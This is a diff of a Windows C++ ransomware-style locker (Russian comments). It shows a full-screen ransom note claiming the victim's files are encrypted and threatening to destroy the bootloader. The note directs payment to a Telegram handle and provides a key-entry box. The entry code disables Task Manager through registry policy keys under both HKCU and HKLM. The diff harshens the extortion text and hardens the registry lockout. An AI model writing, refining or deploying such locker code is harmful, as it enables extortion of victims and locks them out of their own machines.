@@ -58,20 +58,17 @@ static const wchar_t* kArt[] = {
 };
 static constexpr int kArtLines = sizeof(kArt) / sizeof(kArt[0]);
 
-// === ЖЁСТКАЯ ЗАПИСКА ===
+// === ТВОЙ ТЕКСТ ===
 static const wchar_t* kNote[] = {
-    L"ВСЕ ТВОИ ФАЙЛЫ ЗАШИФРОВАНЫ.",
-    L"ТВОЯ ЦИФРОВАЯ ЖИЗНЬ ТЕПЕРЬ ПРИНАДЛЕЖИТ МНЕ.",
+    L"Твои файлы зашифрованы к хуям собачьим.",
     L"",
-    L"Я ЗНАЮ О ТЕБЕ ВСЁ.",
-    L"ВСЕ ТВОИ ФОТО, ПАРОЛИ, ПЕРЕПИСКИ И ДОКУМЕНТЫ - У МЕНЯ.",
+    L"Попытаешься восстановить сам - снесу загрузчик.",
+    L"Твои действия щяс транслируются.",
+    L"Так что не выебывайся.",
     L"",
-    L"ЕСЛИ НЕ ХОЧЕШЬ, ЧТОБЫ ТВОЙ ID УЛЕТЕЛ В СЕТЬ, ЧТОБЫ О ТЕБЕ",
-    L"УЗНАЛИ ВСЕ ТВОИ ДРУЗЬЯ И СЕМЬЯ - У ТЕБЯ 72 ЧАСА.",
-    L"ПОПЫТАЕШЬСЯ ВОССТАНОВИТЬ САМ - КЛЮЧ СГОРИТ НАВСЕГДА.",
+    L"За откупом: @flk_recover",
     L"",
-    L"СВЯЗЬ: @flk_recover (Telegram)",
-    L"ТВОЙ ID: FLK-СКРЫТО-В-ФАЙЛАХ",
+    L"Соси хуец большой и не будь лапшой!",
 };
 static constexpr int kNoteLines = sizeof(kNote) / sizeof(kNote[0]);
 
@@ -86,7 +83,8 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         HDC dc = BeginPaint(h, &ps);
         RECT r; GetClientRect(h, &r);
         
-        HBRUSH bg = CreateSolidBrush(RGB(6, 6, 10));
+        // Черный фон
+        HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
         FillRect(dc, &r, bg); DeleteObject(bg);
         SetBkMode(dc, TRANSPARENT);
 
@@ -104,7 +102,7 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             int lh = tm.tmHeight + 1;
             int art_y = (cy - (kArtLines * lh)) / 2;
 
-            SetTextColor(dc, RGB(160, 20, 20));
+            SetTextColor(dc, RGB(160, 20, 20)); // Темно-красный
             for (int i = 0; i < kArtLines; ++i) {
                 SIZE s{}; GetTextExtentPoint32W(dc, kArt[i], (int)wcslen(kArt[i]), &s);
                 int x = (cx - s.cx) / 2; if (x < 0) x = 0;
@@ -118,61 +116,47 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             int note_fs = cy / 45; 
             HFONT f_note = CreateFontW(-note_fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
                 DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
-                ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Courier New");
+                ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
             HFONT old = (HFONT)SelectObject(dc, f_note);
             
             TEXTMETRICW tm; GetTextMetricsW(dc, &tm);
-            int note_lh = tm.tmHeight + 4;
+            int note_lh = tm.tmHeight + 6;
 
-            int box_w = cx / 1.5; 
-            int box_h = (kNoteLines * note_lh) + 140; 
-            int box_x = (cx - box_w) / 2;
-            int box_y = (cy - box_h) / 2;
+            // Центрируем весь текст по вертикали
+            int total_h = kNoteLines * note_lh;
+            int text_y = (cy - total_h) / 2;
 
-            HBRUSH box_bg = CreateSolidBrush(RGB(10, 10, 10));
-            RECT box_rect = { box_x, box_y, box_x + box_w, box_y + box_h };
-            FillRect(dc, &box_rect, box_bg);
-            DeleteObject(box_bg);
-
-            HPEN border = CreatePen(PS_SOLID, 4, RGB(255, 0, 0));
-            HBRUSH null_brush = (HBRUSH)GetStockObject(NULL_BRUSH);
-            SelectObject(dc, border);
-            SelectObject(dc, null_brush);
-            Rectangle(dc, box_x, box_y, box_x + box_w, box_y + box_h);
-            DeleteObject(border);
-
-            SetTextColor(dc, RGB(255, 40, 40));
-            int text_y = box_y + 30;
+            // ЯРКО-РОЗОВЫЙ ЦВЕТ
+            SetTextColor(dc, RGB(255, 20, 147)); 
             for (int i = 0; i < kNoteLines; ++i) {
                 SIZE s{}; GetTextExtentPoint32W(dc, kNote[i], (int)wcslen(kNote[i]), &s);
-                int text_x = box_x + (box_w - s.cx) / 2; 
-                if (text_x < box_x + 20) text_x = box_x + 20; 
+                int text_x = (cx - s.cx) / 2; 
+                if (text_x < 20) text_x = 20; 
                 TextOutW(dc, text_x, text_y, kNote[i], (int)wcslen(kNote[i]));
                 text_y += note_lh;
             }
 
-            // Поле ввода
-            text_y += 20;
-            std::wstring hint = L"ВВЕДИТЕ КЛЮЧ ДЛЯ РАСШИФРОВКИ:";
-            SetTextColor(dc, RGB(200, 200, 200));
-            TextOutW(dc, box_x + 30, text_y, hint.c_str(), (int)hint.length());
-            text_y += note_lh + 10;
+            // Рисуем поле ввода (тоже розовая рамка)
+            int box_w = cx / 2;
+            int box_h = note_lh + 10;
+            int box_x = (cx - box_w) / 2;
+            int box_y = text_y + 20;
 
-            // Рамка вокруг поля
-            HPEN pwd_border = CreatePen(PS_SOLID, 2, RGB(100, 100, 100));
+            HPEN pwd_border = CreatePen(PS_SOLID, 2, RGB(255, 20, 147));
+            HBRUSH null_brush = (HBRUSH)GetStockObject(NULL_BRUSH);
             SelectObject(dc, pwd_border);
-            Rectangle(dc, box_x + 30, text_y, box_x + box_w - 30, text_y + note_lh + 10);
+            SelectObject(dc, null_brush);
+            Rectangle(dc, box_x, box_y, box_x + box_w, box_y + box_h);
             DeleteObject(pwd_border);
 
-            // Текст в поле
+            // Текст в поле ввода
+            SetTextColor(dc, RGB(255, 255, 255));
             if (g_error) {
-                SetTextColor(dc, RGB(255, 0, 0));
-                std::wstring err = L"ОШИБКА. КЛЮЧ НЕВЕРЕН.";
-                TextOutW(dc, box_x + 40, text_y + 5, err.c_str(), (int)err.length());
+                std::wstring err = L"НЕВЕРНЫЙ КОД";
+                TextOutW(dc, box_x + 10, box_y + 5, err.c_str(), (int)err.length());
             } else {
-                SetTextColor(dc, RGB(255, 255, 255));
                 std::wstring masked(g_pwdLen, L'*');
-                TextOutW(dc, box_x + 40, text_y + 5, masked.c_str(), g_pwdLen);
+                TextOutW(dc, box_x + 10, box_y + 5, masked.c_str(), g_pwdLen);
             }
 
             SelectObject(dc, old); DeleteObject(f_note);
@@ -183,9 +167,12 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
     }
     
     if (m == WM_TIMER) {
-        g_showNote = 1;
-        KillTimer(h, 1); 
-        InvalidateRect(h, nullptr, TRUE); 
+        if (w == 1) {
+            // Смена сцены с арта на текст через 7 секунд
+            g_showNote = 1;
+            KillTimer(h, 1); 
+            InvalidateRect(h, nullptr, TRUE); 
+        }
         return 0;
     }
 
@@ -217,13 +204,18 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
 }
 
 int APIENTRY wWinMain(HINSTANCE h, HINSTANCE, LPWSTR, int) {
+    // Только блокировка Диспетчера задач через реестр (без убийства процессов)
     HKEY k;
-    RegOpenKeyExW(HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
-        0, KEY_SET_VALUE, &k);
-    DWORD v = 1;
-    RegSetValueExW(k, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
-    RegCloseKey(k);
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
+        DWORD v = 1;
+        RegSetValueExW(k, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
+        RegCloseKey(k);
+    }
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
+        DWORD v = 1;
+        RegSetValueExW(k, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
+        RegCloseKey(k);
+    }
 
     WNDCLASSW wc = {};
     wc.lpfnWndProc = WndProc;
@@ -240,6 +232,7 @@ int APIENTRY wWinMain(HINSTANCE h, HINSTANCE, LPWSTR, int) {
     ShowWindow(win, SW_SHOWMAXIMIZED);
     UpdateWindow(win);
 
+    // Таймер на смену арта (7 секунд)
     SetTimer(win, 1, 7000, nullptr);
 
     MSG msg;
